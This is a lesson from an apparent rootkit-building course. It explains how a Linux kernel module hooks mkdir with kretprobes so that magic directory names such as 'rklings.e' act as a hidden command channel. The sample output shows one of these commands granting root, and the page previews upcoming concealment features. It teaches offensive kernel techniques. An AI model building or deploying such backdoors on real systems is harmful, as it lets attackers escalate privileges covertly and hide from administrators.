# L09: Command Dispatcher

L08 uses a kprobe.
It fires before the function runs, so you can read arguments and take action,
but you cannot control the return value.
The real mkdir still returns ENOENT, even when your action succeeded.

## Kretprobe: entry + return

A kretprobe fires two handlers as a matched pair.
The entry handler runs before the function, the return handler runs after.
Between them, you store state in per-instance data.

```text
  mkdir("rklings.ping")
       |
       v
  __x64_sys_mkdir entry
       |
    [entry_handler]
       |  read pathname, parse command
       |  dispatch to handler, store result
       |  nullify pathname, set intercepted=true
       |
       v
  __x64_sys_mkdir runs (empty path, fails)
       |
    [return handler]
       |  if intercepted: regs_set_return_value(result)
       |
       v
  userspace sees return code 0
```

Both handlers receive a `struct kretprobe_instance *ri` as their first argument.
`ri->data` is a per-instance buffer sized by `.data_size`, where you store state
that the return handler reads back.
This is how you pass information from entry to return without global state:

```c
struct rk_mkdir_data {
    int result;
    bool intercepted;
};

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler  = rk_mkdir_entry,
    .handler        = rk_mkdir_return,
    .data_size      = sizeof(struct rk_mkdir_data),
    .maxactive      = 8,
};
```

`.maxactive` limits how many simultaneous calls the probe tracks.
8 is safe for a system call that completes quickly.

## Command table

Instead of a chain of strcmp calls, use a table:

```c
struct rk_cmd_entry {
    const char *key;
    int (*handler)(const char *arg);
};

static const struct rk_cmd_entry cmd_table[] = {
    { "e",      rk_cmd_escalate },
    { "ping",   rk_cmd_ping },
    { "status", rk_cmd_status },
};
```

The dispatcher strips the `rklings.`
prefix, splits on the first dot to separate command from argument, then searches
the table:

```text
rklings.ping        -> cmd="ping",   arg=NULL
rklings.e           -> cmd="e",      arg=NULL
rklings.e.1234      -> cmd="e",      arg="1234"
```

## The trap

A kprobe `pre_handler` returns 0 to continue or non-zero to skip.
A kretprobe `entry_handler` returns 0 to track this call or non-zero to skip
tracking (the return handler will not fire).
They look similar but skip semantics are opposite.

Also: `regs_set_return_value` takes an `unsigned long`.
Cast your int result through `(unsigned long)(long)` to preserve negative
errnos.

## You write

`main.c` (~270 lines):

- kretprobe pair (`__x64_sys_mkdir` + `__x64_sys_mkdirat`)
- `struct rk_mkdir_data` for per-instance state
- command table with exact-match dispatch
- three handlers: `e`, `ping`, `status`

## API

```c
#include <linux/kprobes.h>

int register_kretprobe(struct kretprobe *rp);
void unregister_kretprobe(struct kretprobe *rp);

// Entry/return handler signature
int entry(struct kretprobe_instance *ri, struct pt_regs *regs);
int ret(struct kretprobe_instance *ri, struct pt_regs *regs);

// Per-instance data
struct rk_mkdir_data *data = (struct rk_mkdir_data *)ri->data;

// Override return value (return handler)
regs_set_return_value(regs, (unsigned long)(long)data->result);

// Command parsing
const char *dot = strchr(suffix, '.');
```

## Test it

```
$ rklings run l09
root@vm:~# mkdir rklings.ping && echo "exit: $?"
exit: 0
root@vm:~# dmesg | tail -1
rklings: dispatch: cmd=ping
root@vm:~# mkdir rklings.status && dmesg | tail -1
rklings: alive, escalations=0, deferred=0
root@vm:~# mkdir rklings.e && id
uid=0(root) gid=0(root) groups=0(root)
```

`mkdir rklings.ping` returns exit code 0.
In L08 it returned ENOENT.
The kretprobe return handler overrode the syscall return value.

## Validate

```
$ rklings validate l09
  [+] module loads
  [+] kretprobe registered on __x64_sys_mkdir
  [+] kretprobe registered on __x64_sys_mkdirat
  [+] mkdir rklings.ping returns 0 (not ENOENT)
  [+] ping dispatched in dmesg
  [+] status dispatched in dmesg
  [+] escalation via mkdir rklings.e
  [+] PID targeting via mkdir rklings.e.<pid>
  PASS
```

## Next

You have interception, escalation, and a command dispatcher.
M00 upgrades the dispatcher to longest-prefix matching for commands with
arguments.
L10 adds the data structure behind every concealment exercise: a thread-safe
target list tracking what to hide.
